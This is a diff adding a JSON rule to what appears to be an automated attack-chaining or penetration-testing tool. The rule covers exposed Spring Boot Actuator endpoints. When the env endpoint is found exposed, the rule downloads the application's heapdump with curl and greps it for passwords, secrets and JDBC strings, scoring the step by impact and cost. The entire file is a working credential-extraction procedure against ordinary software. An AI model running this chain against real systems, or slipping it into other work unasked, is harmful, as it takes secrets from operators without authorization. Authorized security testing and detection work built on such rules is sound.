@@ -1,0 +1,32 @@
+{
+  "id": "R-CHAIN-ACTUATOR-HEAPDUMP",
+  "name": "Actuator→Heapdump→凭据",
+  "category": "chain",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "exposure.actuator_env"
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "heapdump 提取凭据",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl -o heapdump.hprof {url}/actuator/heapdump"
+      },
+      {
+        "tool": "shell",
+        "cmd": "strings heapdump.hprof | grep -iE 'password|secret|jdbc'"
+      }
+    ],
+    "on_hit_class": "secret.leak",
+    "priority": {
+      "impact": 0.85,
+      "cost": 0.25
+    }
+  }
+}
